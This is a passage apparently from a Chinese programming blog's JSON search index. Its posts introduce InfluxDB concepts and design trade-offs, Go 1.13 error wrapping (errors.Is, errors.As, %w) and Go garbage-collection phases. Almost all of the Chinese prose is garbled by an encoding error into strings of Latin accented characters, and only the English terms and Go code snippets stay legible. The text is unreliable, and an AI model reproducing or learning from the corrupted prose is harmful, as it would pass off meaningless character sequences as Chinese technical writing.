åˆ†ä¸ºå…è´¹çš„ç¤¾åŒºå¼€æºç‰ˆæœ¬ï¼Œä»¥åŠéœ€è¦æ”¶è´¹çš„é—­æºå•†ä¸šç‰ˆæœ¬ï¼Œç›®å‰åªæœ‰å•†ä¸šç‰ˆæœ¬æ”¯æŒé›†ç¾¤ã€‚ InfluxDB çš„åº•å±‚æ•°æ®ç»“æ„ä» LSM æ ‘åˆ° B+ æ ‘æŠ˜è…¾äº†ä¸€é€šï¼Œæœ€åè‡ªåˆ›äº†ä¸€ä¸ª TSM æ ‘ï¼ˆ Time-Structured Merge Tree ï¼‰ï¼Œè¿™ä¹Ÿæ˜¯å®ƒæ€§èƒ½é«˜ä¸”èµ„æºå ç”¨å°‘çš„é‡è¦åŸå› ã€‚ InfluxDB ç”± go è¯­è¨€ç¼–å†™è€Œæˆï¼Œæ²¡æœ‰é¢å¤–çš„ä¾èµ–ï¼Œå®ƒçš„æŸ¥è¯¢è¯­è¨€ InfluxQL ä¸ SQL æå…¶ç›¸ä¼¼ï¼Œä½¿ç”¨ç‰¹åˆ«ç®€å•ã€‚ InfluxDB åŸºæœ¬æ¦‚å¿µ InfluxDB æœ‰ä»¥ä¸‹å‡ ä¸ªæ ¸å¿ƒæ¦‚å¿µï¼š 1ã€database ï¼š æ•°æ®åº“ã€‚ 2ã€measurement ç±»ä¼¼äºè¡¨ã€‚ 3ã€retention policyï¼ˆ ç®€ç§° RP ï¼‰ ä¿ç•™ç­–ç•¥ï¼Œç”±ä»¥ä¸‹ä¸‰ä¸ªéƒ¨åˆ†æ„æˆï¼š DURATIONï¼šæ•°æ®çš„ä¿ç•™æ—¶é•¿ã€‚ REPLICATIONï¼šé›†ç¾¤æ¨¡å¼ä¸‹æ•°æ®çš„å‰¯æœ¬æ•°ï¼Œå•èŠ‚ç‚¹æ— æ•ˆã€‚ SHARD DURATIONï¼šå¯é€‰é¡¹ï¼Œshard group åˆ’åˆ†çš„æ—¶é—´èŒƒå›´ã€‚ 4ã€timestamp æ—¶é—´æˆ³ï¼Œå°±åƒæ˜¯æ‰€æœ‰æ•°æ®çš„ä¸»é”®ä¸€æ ·ã€‚ 5ã€tag tag key = tag value é”®å€¼å¯¹å­˜å‚¨å…·ä½“çš„æ•°æ®ï¼Œä¼šæ„å»ºç´¢å¼•æœ‰åˆ©äºæŸ¥è¯¢ã€‚tag set å°±æ˜¯ tag key-value é”®å€¼å¯¹çš„ä¸åŒç»„åˆã€‚ 6ã€field field key = field value é”®å€¼å¯¹ä¹Ÿæ˜¯å­˜å‚¨å…·ä½“çš„æ•°æ®ï¼Œä½†ä¸ä¼šè¢«ç´¢å¼•ã€‚ç±»ä¼¼çš„ field set å°±æ˜¯ field key-value çš„ç»„åˆã€‚ 7ã€series ä¸€ä¸ª series åºåˆ—æ˜¯ç”±åŒä¸€ä¸ª RP ç­–ç•¥ä¸‹çš„åŒä¸€ä¸ª measurement é‡Œçš„åŒä¸€ä¸ª tag set æ„æˆçš„æ•°æ®é›†åˆã€‚ 8ã€point ä¸€ä¸ª point ç‚¹ä»£è¡¨äº†ä¸€æ¡æ•°æ®ï¼Œç”± measurementã€tag setã€field setã€timestamp ç»„æˆã€‚ä¸€ä¸ª series ä¸Šçš„æŸä¸ª timestamp æ—¶é—´å¯¹åº”å”¯ä¸€ä¸€ä¸ª point ã€‚ Line protocol è¡Œåè®® è¡Œåè®®æŒ‡å®šäº†å†™å…¥æ•°æ®çš„æ ¼å¼ï¼š \u003cmeasurement\u003e[,\u003ctag-key\u003e=\u003ctag-value\u003e...] \u003cfield-key\u003e=\u003cfield-value\u003e[,\u003cfield2-key\u003e=\u003cfield2-value\u003e...] [unix-nano-timestamp] ç¬¦å· [] ä»£è¡¨å¯é€‰é¡¹ï¼Œç¬¦å· â€¦ ä»£è¡¨å¯ä»¥æœ‰å¤šä¸ªï¼Œç¬¦å· ï¼Œç”¨æ¥åˆ†éš”ç›¸åŒ tag æˆ–è€… field ä¸‹çš„å¤šä¸ªæ•°æ®ï¼Œç¬¦å·ç©ºæ ¼åˆ†éš” tagã€fieldã€timestamp ã€‚ ç¤ºä¾‹ï¼š æ€ä¹ˆå»ç†è§£ series å’Œ point ï¼Ÿå…ˆçœ‹ä¸‹å›¾ï¼š è¿™å¼ å›¾é€‰å–äº†ä¸‰ç§æ—¶åºæ•°æ®åº“çš„å†å¹´æ’åå¾—åˆ†æƒ…å†µã€‚é¦–å…ˆï¼Œæ•´ä¸ªå›¾è¡¨å¯ä»¥çœ‹æˆæ˜¯ä¸€ä¸ª measurement ï¼Œå®ƒåŒ…å«äº†è®¸å¤šæ•°æ®ï¼›ç„¶åæˆ‘ä»¬æ ¹æ® db åç§°æ„å»º tag ï¼ŒæŠŠ score æ’åå¾—åˆ†ä½œä¸º field ï¼Œé‚£ä¹ˆæ‰€æœ‰æ•°æ®è¡Œå°±ç±»ä¼¼äºï¼š measurement,db=InfluxDB score=5 timestamp measurement,db=Kdb+ score=1 timestamp measurement,db=Prometheus score=0.2 timestamp ... ä¸Šæ–‡è¯´è¿‡ tag set å°±æ˜¯ tag key = tag value çš„ä¸åŒç»„åˆï¼Œå› æ­¤è¿™é‡Œçš„ tag set æœ‰ä»¥ä¸‹ä¸‰ç§ï¼š db=InfluxDB db=Kdb+ db=Prometheus ä¸‰ä¸ª tag set æ„æˆäº†ä¸‰ä¸ª series ï¼Œæ¯ä¸ª series å°±å¯ä»¥çœ‹æˆæ˜¯å›¾ä¸­çš„ä¸€æ¡çº¿ï¼ˆä¸€ä¸ªç»´åº¦ï¼‰ï¼Œè€Œæ¯ä¸ª point ç‚¹å°±æ˜¯ series ä¸Šå…·ä½“æŸä¸ª timestamp å¯¹åº”çš„ç‚¹ã€‚ ä¸ä¼ ç»Ÿæ•°æ®åº“çš„ä¸åŒ InfluxDB å°±æ˜¯è¢«è®¾è®¡ç”¨äºå¤„ç†æ—¶é—´åºåˆ—çš„æ•°æ®ã€‚ä¼ ç»ŸSQLæ•°æ®åº“è™½ç„¶ä¹Ÿå¯ä»¥å¤„ç†æ—¶é—´åºåˆ—æ•°æ®ï¼Œä½†å¹¶ä¸æ˜¯ä¸“é—¨ä»¥æ­¤ä¸ºç›®æ ‡çš„ã€‚InfluxDB å¯ä»¥æ›´åŠ é«˜æ•ˆå¿«é€Ÿçš„å­˜å‚¨å¤§é‡æ—¶é—´åºåˆ—æ•°æ®å¹¶å¯¹è¿™äº›æ•°æ®è¿›è¡Œå®æ—¶åˆ†æã€‚ åœ¨ InfluxDB ä¸­ï¼Œæ—¶é—´æ˜¯ç»å¯¹çš„ä¸»è§’ï¼Œå°±åƒæ˜¯SQLæ•°æ®åº“ä¸­çš„ä¸»é”®ä¸€æ ·ï¼Œå¦‚æœä½ ä¸æŒ‡å®šåˆ™ä¼šé»˜è®¤ä¸ºç³»ç»Ÿå½“å‰æ—¶é—´ï¼Œæ—¶é—´å¿…é¡»æ˜¯ UNIX epoch ( GMT ) æˆ–è€… RFC3339 æ ¼å¼ã€‚ InfluxDB ä¸éœ€è¦é¢„å…ˆå®šä¹‰å¥½æ•°æ®çš„ç»“æ„ï¼Œä½ å¯ä»¥éšæ—¶æ”¹å˜ä½ çš„æ•°æ®ç»“æ„ã€‚InfluxDB æ”¯æŒ continuous queriesï¼ˆè¿ç»­æŸ¥è¯¢ï¼Œå°±æ˜¯ä»¥æ—¶é—´åˆ’åˆ†èŒƒå›´è‡ªåŠ¨å®šæœŸæ‰§è¡ŒæŸä¸ªæŸ¥è¯¢ï¼‰å’Œ retention policiesï¼ˆä¿ç•™ç­–ç•¥ï¼‰ã€‚InfluxDB ä¸æ”¯æŒè·¨ measurement çš„ JOIN æŸ¥è¯¢ã€‚ InfluxDB ä¸­çš„æŸ¥è¯¢è¯­è¨€å« InfluxQL ï¼Œè¯­æ³•ä¸ SQL æå…¶ç›¸ä¼¼ï¼Œå°±æ˜¯ select from where é‚£ä¸€å¥—ã€‚ InfluxDB å¹¶ä¸æ˜¯ CRUDï¼Œæ›´åƒæ˜¯ CR-ud ï¼Œæ„æ€å°±æ˜¯æ›´æ–°å’Œåˆ é™¤æ•°æ®è·Ÿä¼ ç»ŸSQLæ•°æ®åº“æ˜æ˜¾ä¸ä¸€æ ·ï¼š æ›´æ–°æŸä¸ª point æ•°æ®ï¼Œåªéœ€å‘åŸæ¥çš„ measurementï¼Œtag setï¼Œtimestamp é‡å†™æ•°æ®å³å¯ã€‚ ä½ å¯ä»¥åˆ é™¤ series ï¼Œä½†æ˜¯ä¸èƒ½åŸºäº field å€¼å»åˆ é™¤ç‹¬ç«‹çš„ points ï¼Œè§£å†³æ–¹æ³•æ˜¯ï¼Œä½ éœ€è¦å…ˆæŸ¥è¯¢ field å€¼çš„æ—¶é—´æˆ³ï¼Œç„¶åæ ¹æ®æ—¶é—´æˆ³å»åˆ é™¤ã€‚ æ— æ³•æ›´æ–°æˆ–é‡å‘½å tags ï¼Œå› ä¸º tags ä¼šæ„å»ºç´¢å¼•ï¼Œä½ åªèƒ½åˆ›å»ºæ–°çš„ tags å¹¶å¯¼å…¥æ•°æ®ç„¶ååˆ é™¤è€çš„ã€‚ æ— æ³•é€šè¿‡ tag key æˆ–è€… tag value å»åˆ é™¤ tags ã€‚ è®¾è®¡ä¸æƒè¡¡ä¹‹é“ InfluxDB ä¸ºäº†æ›´é«˜çš„æ€§èƒ½åšäº†ä¸€äº›è®¾è®¡ä¸æƒè¡¡ä¹‹é“ï¼š 1ã€å¯¹äºæ—¶é—´åºåˆ—ç”¨ä¾‹ï¼Œå³ä½¿ç›¸åŒçš„æ•°æ®è¢«å‘é€å¤šæ¬¡ä¹Ÿä¼šè¢«è®¤ä¸ºæ˜¯åŒä¸€ç¬”æ•°æ®ã€‚ ä¼˜ç‚¹ï¼šç®€åŒ–äº†å†²çªï¼Œæé«˜äº†å†™å…¥æ€§èƒ½ã€‚ ç¼ºç‚¹ï¼šä¸èƒ½å­˜å‚¨é‡å¤æ•°æ®ï¼Œå¯èƒ½ä¼šåœ¨æå°‘æ•°æƒ…å†µä¸‹è¦†ç›–æ•°æ®ã€‚ 2ã€åˆ é™¤æ˜¯ç½•è§çš„ï¼Œå½“å®ƒä»¬å‘ç”Ÿæ—¶è‚¯å®šæ˜¯é’ˆå¯¹å¤§é‡çš„æ—§æ•°æ®ã€‚ ä¼˜ç‚¹ï¼šæé«˜äº†è¯»å†™æ€§èƒ½ã€‚ ç¼ºç‚¹ï¼šåˆ é™¤åŠŸèƒ½å—åˆ°äº†å¾ˆå¤§é™åˆ¶ã€‚ 3ã€æ›´æ–°æ˜¯ç½•è§çš„ï¼ŒæŒç»­æˆ–è€…å¤§æ‰¹é‡çš„æ›´æ–°ä¸ä¼šå‘ç”Ÿã€‚æ—¶é—´åºåˆ—çš„æ•°æ®ä¸»è¦æ˜¯æ°¸è¿œä¹Ÿä¸ä¼šæ›´æ–°çš„æ–°æ•°æ®ã€‚ ä¼˜ç‚¹ï¼šæé«˜äº†è¯»å†™æ€§èƒ½ã€‚ ç¼ºç‚¹ï¼šæ›´æ–°åŠŸèƒ½å—åˆ°äº†å¾ˆå¤§é™åˆ¶ã€‚ 4ã€ç»å¤§å¤šæ•°å†™å…¥éƒ½æ˜¯æ¥è¿‘å½“å‰æ—¶é—´æˆ³çš„æ•°æ®ï¼Œå¹¶ä¸”æ˜¯æŒ‰æ—¶é—´é€’å¢é¡ºåºæ·»åŠ ã€‚ ä¼˜ç‚¹ï¼šæŒ‰æ—¶é—´é€’å¢çš„é¡ºåºå†™å…¥æ•°æ®æ›´é«˜æ•ˆã€‚ ç¼ºç‚¹ï¼šéšæœºæ—¶é—´å†™å…¥çš„æ€§èƒ½è¦ä½å¾ˆå¤šã€‚ 5ã€æ•°æ®è§„æ¨¡è‡³å…³é‡è¦ï¼Œæ•°æ®åº“å¿…é¡»èƒ½å¤Ÿå¤„ç†å¤§é‡çš„è¯»å†™ã€‚ ä¼˜ç‚¹ï¼šæ•°æ®åº“å¯ä»¥å¤„ç†å¤§æ‰¹é‡æ•°æ®çš„è¯»å†™ã€‚ ç¼ºç‚¹ï¼šè¢«è¿«åšå‡ºçš„ä¸€äº›æƒè¡¡å»æé«˜æ€§èƒ½ã€‚ 6ã€èƒ½å¤Ÿå†™å…¥å’ŒæŸ¥è¯¢æ•°æ®æ¯”å…·æœ‰å¼ºä¸€è‡´æ€§æ›´é‡è¦ã€‚ ä¼˜ç‚¹ï¼šå¤šä¸ªå®¢æˆ·ç«¯å¯ä»¥åœ¨é«˜è´Ÿè½½çš„æƒ…å†µä¸‹å®ŒæˆæŸ¥è¯¢å’Œå†™å…¥æ“ä½œã€‚ ç¼ºç‚¹ï¼šå¦‚æœè´Ÿè½½è¿‡é«˜ï¼ŒæŸ¥è¯¢ç»“æœå¯èƒ½ä¸åŒ…å«æœ€è¿‘çš„ç‚¹ã€‚ 7ã€è®¸å¤šæ—¶é—´åºåˆ—éƒ½æ˜¯çŸ­æš‚çš„ã€‚æ—¶é—´åºåˆ—å¯èƒ½åªæœ‰å‡ ä¸ªå°æ—¶ç„¶åå°±æ²¡äº†ï¼Œæ¯”å¦‚ä¸€å°æ–°çš„ä¸»æœºå¼€æœºï¼Œç›‘æ§æ•°æ®å†™å…¥ä¸€æ®µæ—¶é—´ï¼Œç„¶åå…³æœºäº†ã€‚ ä¼˜ç‚¹ï¼šInfluxDB å–„äºç®¡ç†ä¸è¿ç»­çš„æ•°æ®ã€‚ ç¼ºç‚¹ï¼šæ— æ¨¡å¼è®¾è®¡æ„å‘³ç€ä¸æ”¯æŒæŸäº›æ•°æ®åº“åŠŸèƒ½ï¼Œä¾‹å¦‚æ²¡æœ‰ join äº¤å‰è¡¨è¿æ¥ã€‚ 8ã€No one point is too important ã€‚ ä¼˜ç‚¹ï¼šInfluxDB å…·æœ‰éå¸¸å¼ºå¤§çš„å·¥å…·å»å¤„ç†èšåˆæ•°æ®å’Œå¤§æ•°æ®é›†ã€‚ ç¼ºç‚¹ï¼šPoints æ•°æ®ç‚¹æ²¡æœ‰ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„ ID ï¼Œå®ƒä»¬è¢«æ—¶é—´æˆ³å’Œ series åŒºåˆ†ã€‚ ç›¸å…³æ–‡ç« ï¼š æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸€ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆäºŒï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸‰ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆå››ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆäº”ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆå…­ï¼‰ æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸ƒï¼‰ ","date":"2019-10-25","objectID":"/1/:0:0","tags":["InfluxDB"],"title":"æ—¶åºæ•°æ®åº“ InfluxDBï¼ˆä¸€ï¼‰","uri":"/1/"},{"categories":["Golang"],"content":"Go Errors é”™è¯¯å¤„ç†","date":"2019-10-18","objectID":"/errors/","tags":["Golang"],"title":"Go Errors é”™è¯¯å¤„ç†","uri":"/errors/"},{"categories":["Golang"],"content":"Golang ä¸­çš„ error æ˜¯ä¸€ä¸ªå†…ç½®çš„ç‰¹æ®Šçš„æ¥å£ç±»å‹ï¼š type error interface { Error() string } åœ¨ Go 1.13 ç‰ˆæœ¬ä¹‹å‰ï¼Œæœ‰å…³ error çš„æ–¹æ³•åªæœ‰ä¸¤ä¸ªï¼š errors.New : func New(text string) error fmt.Errorf : func Errorf(format string, a ...interface{}) error è¿™ä¸¤ä¸ªæ–¹æ³•éƒ½æ˜¯ç”¨æ¥ç”Ÿæˆä¸€ä¸ªæ–°çš„ error ç±»å‹çš„æ•°æ®ã€‚ ","date":"2019-10-18","objectID":"/errors/:0:0","tags":["Golang"],"title":"Go Errors é”™è¯¯å¤„ç†","uri":"/errors/"},{"categories":["Golang"],"content":"1.13 ç‰ˆæœ¬ä¹‹å‰çš„é”™è¯¯å¤„ç† æœ€å¸¸è§çš„ï¼Œåˆ¤æ–­æ˜¯å¦ä¸º nil ï¼š if err != nil { // something went wrong } åˆ¤æ–­æ˜¯å¦ä¸ºæŸä¸ªç‰¹å®šçš„é”™è¯¯ï¼š var ErrNotFound = errors.New(\"not found\") if err == ErrNotFound { // something wasn't found } error æ˜¯ä¸€ä¸ªå¸¦æœ‰ Error æ–¹æ³•çš„æ¥å£ç±»å‹ï¼Œè¿™æ„å‘³ç€ä½ å¯ä»¥è‡ªå·±å»å®ç°è¿™ä¸ªæ¥å£ï¼š type NotFoundError struct { Name string } func (e *NotFoundError) Error() string { return e.Name + \": not found\" } if e, ok := err.(*NotFoundError); ok { // e.Name wasn't found } å¤„ç†é”™è¯¯çš„æ—¶å€™æˆ‘ä»¬é€šå¸¸ä¼šæ·»åŠ ä¸€äº›é¢å¤–çš„ä¿¡æ¯ï¼Œè®°å½•é”™è¯¯çš„ä¸Šä¸‹æ–‡ä»¥ä¾¿äºåç»­æ’æŸ¥ï¼š if err != nil { return fmt.Errorf(\"é”™è¯¯ä¸Šä¸‹æ–‡ %v: %v\", name, err) } fmt.Errorf æ–¹æ³•ä¼šåˆ›å»ºä¸€ä¸ªåŒ…å«æœ‰åŸå§‹é”™è¯¯æ–‡æœ¬ä¿¡æ¯çš„æ–°çš„ error ï¼Œä½†æ˜¯ä¸åŸå§‹é”™è¯¯ä¹‹é—´æ˜¯æ²¡æœ‰ä»»ä½•å…³è”çš„ã€‚ ç„¶è€Œæˆ‘ä»¬æœ‰æ—¶å€™æ˜¯éœ€è¦ä¿ç•™è¿™ç§å…³è”æ€§çš„ï¼Œè¿™æ—¶å€™å°±éœ€è¦æˆ‘ä»¬è‡ªå·±å»å®šä¹‰ä¸€ä¸ªåŒ…å«æœ‰åŸå§‹é”™è¯¯çš„æ–°çš„é”™è¯¯ç±»å‹ï¼Œæ¯”å¦‚è‡ªå®šä¹‰ä¸€ä¸ª QueryError ï¼š type QueryError struct { Query string Err error // ä¸åŸå§‹é”™è¯¯å…³è” } ç„¶åå¯ä»¥åˆ¤æ–­è¿™ä¸ªåŸå§‹é”™è¯¯æ˜¯å¦ä¸ºæŸä¸ªç‰¹å®šçš„é”™è¯¯ï¼Œæ¯”å¦‚ ErrPermission ï¼š if e, ok := err.(*QueryError); ok \u0026\u0026 e.Err == ErrPermission { // query failed because of a permission problem } å†™åˆ°è¿™é‡Œï¼Œä½ å¯ä»¥å‘ç°å¯¹äºé”™è¯¯çš„å…³è”åµŒå¥—æƒ…å†µå¤„ç†èµ·æ¥æ˜¯æ¯”è¾ƒéº»çƒ¦çš„ï¼Œè€Œ Go 1.13 ç‰ˆæœ¬å¯¹æ­¤åšäº†æ”¹è¿›ã€‚ ","date":"2019-10-18","objectID":"/errors/:1:0","tags":["Golang"],"title":"Go Errors é”™è¯¯å¤„ç†","uri":"/errors/"},{"categories":["Golang"],"content":"1.13 ç‰ˆæœ¬ä¹‹åçš„é”™è¯¯å¤„ç† é¦–å…ˆéœ€è¦è¯´æ˜çš„æ˜¯ï¼ŒGo æ˜¯å‘ä¸‹å…¼å®¹çš„ï¼Œä¸Šæ–‡ä¸­çš„ 1.13 ç‰ˆæœ¬ä¹‹å‰çš„ç”¨æ³•å®Œå…¨å¯ä»¥ç»§ç»­ä½¿ç”¨ã€‚ 1.13 ç‰ˆæœ¬çš„æ”¹è¿›æ˜¯ï¼š æ–°å¢æ–¹æ³• errors.Unwrap : func Unwrap(err error) error æ–°å¢æ–¹æ³• errors.Is : func Is(err, target error) bool æ–°å¢æ–¹æ³• errors.As : func As(err error, target interface{}) bool fmt.Errorf æ–¹æ³•æ–°å¢äº† %w æ ¼å¼åŒ–åŠ¨è¯ï¼Œè¿”å›çš„ error è‡ªåŠ¨å®ç°äº† Unwrap æ–¹æ³•ã€‚ ä¸‹é¢è¿›è¡Œè¯¦ç»†è¯´æ˜ã€‚ å¯¹äºé”™è¯¯åµŒå¥—çš„æƒ…å†µï¼ŒUnwrap æ–¹æ³•å¯ä»¥ç”¨æ¥è¿”å›æŸä¸ªé”™è¯¯æ‰€åŒ…å«çš„åº•å±‚é”™è¯¯ï¼Œä¾‹å¦‚ e1 åŒ…å«äº† e2 ï¼Œè¿™é‡Œ Unwrap e1 å°±å¯ä»¥å¾—åˆ° e2 ã€‚Unwrap æ”¯æŒé“¾å¼è°ƒç”¨ï¼ˆå¤„ç†é”™è¯¯çš„å¤šå±‚åµŒå¥—ï¼‰ã€‚ ä½¿ç”¨ errors.Is å’Œ errors.As æ–¹æ³•æ£€æŸ¥é”™è¯¯ï¼š errors.Is æ–¹æ³•æ£€æŸ¥å€¼ï¼š if errors.Is(err, ErrNotFound) { // something wasn't found } errors.As æ–¹æ³•æ£€æŸ¥ç‰¹å®šé”™è¯¯ç±»å‹ï¼š var e *QueryError if errors.As(err, \u0026e) { // err is a *QueryError, and e is set to the error's value } errors.Is æ–¹æ³•ä¼šå¯¹åµŒå¥—çš„æƒ…å†µå±•å¼€åˆ¤æ–­ï¼Œè¿™æ„å‘³ç€ï¼š if e, ok := err.(*QueryError); ok \u0026\u0026 e.Err == ErrPermission { // query failed because of a permission problem } å¯ä»¥ç›´æ¥ç®€å†™ä¸ºï¼š if errors.Is(err, ErrPermission) { // err, or some error that it wraps, is a permission problem } fmt.Errorf æ–¹æ³•é€šè¿‡ %w åŒ…è£…é”™è¯¯ï¼š if err != nil { return fmt.Errorf(\"é”™è¯¯ä¸Šä¸‹æ–‡ %v: %v\", name, err) } ä¸Šé¢é€šè¿‡ %v æ˜¯ç›´æ¥è¿”å›ä¸€ä¸ªä¸åŸå§‹é”™è¯¯æ— æ³•å…³è”çš„æ–°çš„é”™è¯¯ã€‚ æˆ‘ä»¬ä½¿ç”¨ %w å°±å¯ä»¥è¿›è¡Œå…³è”äº†ï¼š if err != nil { // Return an error which unwraps to err. return fmt.Errorf(\"é”™è¯¯ä¸Šä¸‹æ–‡ %v: %w\", name, err) } ä¸€æ—¦ä½¿ç”¨ %w è¿›è¡Œäº†å…³è”ï¼Œå°±å¯ä»¥ä½¿ç”¨ errors.Is å’Œ errors.As æ–¹æ³•äº†ï¼š err := fmt.Errorf(\"access denied: %wâ€, ErrPermission) ... if errors.Is(err, ErrPermission) ... å¯¹äºæ˜¯å¦åŒ…è£…é”™è¯¯ä»¥åŠå¦‚ä½•åŒ…è£…é”™è¯¯å¹¶æ²¡æœ‰ç»Ÿä¸€çš„ç­”æ¡ˆã€‚ ","date":"2019-10-18","objectID":"/errors/:2:0","tags":["Golang"],"title":"Go Errors é”™è¯¯å¤„ç†","uri":"/errors/"},{"categories":["Golang"],"content":"å‚è€ƒèµ„æ–™ https://blog.golang.org/go1.13-errors ","date":"2019-10-18","objectID":"/errors/:3:0","tags":["Golang"],"title":"Go Errors é”™è¯¯å¤„ç†","uri":"/errors/"},{"categories":["Golang"],"content":"Go åƒåœ¾å›æ”¶","date":"2019-09-25","objectID":"/gc/","tags":["Golang"],"title":"Go åƒåœ¾å›æ”¶","uri":"/gc/"},{"categories":["Golang"],"content":"Garbage Collectionï¼ˆ GC ï¼‰ä¹Ÿå°±æ˜¯åƒåœ¾å›æ”¶åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿå†…å­˜ç©ºé—´æ˜¯æœ‰é™çš„ï¼Œè¯¸å¦‚å˜é‡ç­‰éœ€è¦åˆ†é…å†…å­˜æ‰èƒ½å­˜å‚¨æ•°æ®ï¼Œè€Œå½“è¿™ä¸ªå˜é‡ä¸å†ä½¿ç”¨çš„æ—¶å€™å°±éœ€è¦é‡Šæ”¾å®ƒå ç”¨çš„å†…å­˜ï¼Œè¿™å°±æ˜¯åƒåœ¾å›æ”¶ã€‚ Go çš„åƒåœ¾å›æ”¶è¿è¡Œåœ¨åå°çš„å®ˆæŠ¤çº¿ç¨‹ä¸­ï¼Œä¼šè‡ªåŠ¨è¿½è¸ªæ£€æŸ¥å¯¹è±¡çš„ä½¿ç”¨æƒ…å†µï¼Œç„¶åå›æ”¶ä¸å†ä½¿ç”¨çš„ç©ºé—´ï¼Œæˆ‘ä»¬ä¸€èˆ¬å¹¶ä¸ä¼šä¹Ÿä¸éœ€è¦ç›´æ¥æ¥è§¦åˆ°å®ƒã€‚ ","date":"2019-09-25","objectID":"/gc/:0:0","tags":["Golang"],"title":"Go åƒåœ¾å›æ”¶","uri":"/gc/"},{"categories":["Golang"],"content":"GC æ¨¡å‹ Go ä½¿ç”¨çš„æ˜¯ Mark-Sweepï¼ˆæ ‡è®°-æ¸…é™¤ï¼‰æ–¹å¼ï¼Œå…¶å…·ä½“çš„åƒåœ¾å›æ”¶ç®—æ³•ä¸€ç›´éƒ½åœ¨è°ƒæ•´ä¼˜åŒ–ï¼Œæœ¬æ–‡å¹¶ä¸æ‰“ç®—å»ä»‹ç»è¿™äº›ç®—æ³•ï¼Œè€Œæ˜¯ä»ä¸€ä¸ªæ•´ä½“çš„è§’åº¦å»æè¿° GC çš„è¿‡ç¨‹ã€‚ Collection å¯ä»¥åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼š Mark Setup - STW Marking - Concurrent Mark Termination - STW STW æ˜¯ Stop The World çš„ç¼©å†™ï¼Œæ„æ€æ˜¯ GC çš„æ—¶å€™ä¼šæš‚åœå…¶å®ƒæ‰€æœ‰ä»»åŠ¡ï¼Œæ­£æ˜¯å¦‚æ­¤æ‰å¯¼è‡´äº†å»¶è¿Ÿçš„å­˜åœ¨ã€‚ ","date":"2019-09-25","objectID":"/gc/:1:0","tags":["Golang"],"title":"Go åƒåœ¾å›æ”¶","uri":"/gc/"},{"categories":["Golang"],"content":"1ã€Mark Setup - STW åƒåœ¾å›æ”¶å¼€å§‹ï¼Œé¦–å…ˆéœ€è¦å¼€å¯ Write Barrierï¼ˆå†™å±éšœï¼‰ï¼Œä¸ºæ­¤æ‰€æœ‰åº”ç”¨ç¨‹åº goroutine å¿…é¡»æš‚åœï¼Œè¿™ä¸ªè¿‡ç¨‹é€šå¸¸å¾ˆå¿«ï¼Œå¹³å‡ 10 - 30 å¾®ç§’ã€‚ å‡è®¾åº”ç”¨ç¨‹åºå½“å‰è¿è¡Œäº†å››ä¸ª goroutine : æˆ‘ä»¬éœ€è¦ç­‰å¾…æ‰€æœ‰ goroutine æš‚åœï¼Œè€Œæš‚åœæ“ä½œæ˜¯éœ€è¦å‡ºç°ä¸€æ¬¡å‡½æ•°è°ƒç”¨æ‰èƒ½å®Œæˆï¼Œå¦‚æœæŸä¸ª goroutine å§‹ç»ˆæ²¡æœ‰å‘ç”Ÿå‡½æ•°è°ƒç”¨ï¼ˆæ¯”å¦‚ä¸€ç›´åœ¨æ‰§è¡ŒæŸä¸ªéå¸¸é•¿çš„å¾ªç¯æ“ä½œï¼‰è€Œå…¶å®ƒ goroutine å´å®Œæˆäº†ä¼šæ€æ ·ï¼Œå°±ä¼šå¦‚ä¸‹å›¾ï¼š ç„¶è€Œï¼Œå¿…é¡»æ‰€æœ‰çš„ goroutine å…¨éƒ¨éƒ½æš‚åœï¼Œåƒåœ¾å›æ”¶æ‰èƒ½ç»§ç»­è¿›è¡Œï¼Œä¸ç„¶å°±ä¼šå¡åœ¨è¿™é‡Œä¸€ç›´ç­‰å¾…ï¼Œç»“æœå°±æ˜¯å»¶è¿Ÿè¶Šæ¥è¶Šé«˜ã€‚è¿™ä¸ªé—®é¢˜å®˜æ–¹å›¢é˜Ÿè®¡åˆ’å°†åœ¨ 1.14 ç‰ˆæœ¬é€šè¿‡ä¼˜å…ˆç­–ç•¥è¿›è¡Œä¼˜åŒ–ã€‚ ä¸€æ—¦è¿™ä¸€é˜¶æ®µå®Œæˆï¼ŒWrite Barrierï¼ˆå†™å±éšœï¼‰å¼€å¯ï¼Œå°±ä¼šè¿›å…¥ä¸‹ä¸€é˜¶æ®µã€‚ ","date":"2019-09-25","objectID":"/gc/:1:1","tags":["Golang"],"title":"Go åƒåœ¾å›æ”¶","uri":"/gc/"},{"categories":["Golang"],"content":"2ã€Marking - Concurrent è¿›è¡Œæ ‡è®°ï¼ŒConcurrent è¡¨ç¤ºè¿™ä¸ªè¿‡ç¨‹æ˜¯å¹¶å‘è¿›è¡Œçš„ï¼Œä¸ä¼š STW ï¼ŒGC ä¼šå…ˆå¾ç”¨ 25% çš„ CPU èµ„æºï¼Œå¦‚ä¸‹å›¾ï¼š GC å ç”¨äº† P1 é€»è¾‘å¤„ç†å™¨ï¼Œè€Œå…¶å®ƒ goroutine æ­£å¸¸çš„å¹¶å‘è¿è¡Œã€‚ ä½†æ˜¯ï¼Œæœ‰äº›æ—¶å€™ GC çš„ä»»åŠ¡ç‰¹åˆ«ç¹é‡ï¼Œéœ€è¦æ›´å¤šçš„èµ„æºï¼Œè¿™ä¸ªæ—¶å€™æ€ä¹ˆåŠï¼Ÿå¼€å¯ Mark Assit ååŠ©å·¥ä½œï¼Œå¦‚ä¸‹å›¾ä¸­çš„ MA ï¼š æ ‡è®°å®Œæˆï¼Œè¿›è¡Œä¸‹ä¸€ä¸ªé˜¶æ®µã€‚ ","date":"2019-09-25","objectID":"/gc/:1:2","tags":["Golang"],"title":"Go åƒåœ¾å›æ”¶","uri":"/gc/"},{"categories":["Golang"],"content":"3ã€Mark Termination - STW æ ‡è®°ç»ˆæ­¢ã€‚å…³é—­ Write Barrierï¼ˆå†™å±éšœï¼‰ï¼Œæ‰§è¡Œå„ç§æ¸…ç†ä»»åŠ¡ï¼Œç„¶åè®¡ç®—ä¸‹ä¸€æ¬¡ GC çš„ç›®æ ‡ï¼Œè¿™ä¸ªé˜¶æ®µä¹Ÿæ˜¯éœ€è¦ STW 